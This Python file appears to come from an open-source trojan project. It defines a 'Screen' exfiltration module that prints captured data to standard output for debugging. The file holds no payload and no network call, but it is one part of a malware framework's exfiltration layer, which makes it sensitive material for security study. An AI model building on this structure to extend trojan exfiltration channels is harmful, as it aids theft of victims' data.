#!/usr/bin/env python3
# https://github.com/EONRaider/bca-trojan

__author__ = "EONRaider @ keybase.io/eonraider"

from src.modules.exfiltration.base import ExfiltrationModule, ExploitationModule


class Screen(ExfiltrationModule):
    def __init__(self, *, module: ExploitationModule):
        super().__init__(module)

    def update(self, message: str) -> None:
        """Display captured data at STDOUT for debugging purposes."""
        print(message)
